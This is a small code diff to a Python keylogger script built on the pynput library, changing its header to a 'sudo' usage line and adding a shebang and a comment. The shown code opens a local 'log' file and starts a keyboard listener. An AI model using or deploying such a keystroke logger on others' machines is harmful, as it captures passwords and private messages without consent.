@@ -1,8 +1,10 @@
 """
-	Requires Python 3.7 and pynput installed
-
-	source: https://pypi.org/project/pynput/
+	Usage: sudo python3.7 keylogger.py
+	Source: https://pypi.org/project/pynput/
 """
+
+#!/usr/bin/env python3.7
+
 from pynput import keyboard
 
 log = open("log", "w")
@@ -21,6 +23,7 @@ def on_release(key):
 		return False #stop listener
 
 
+#start listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
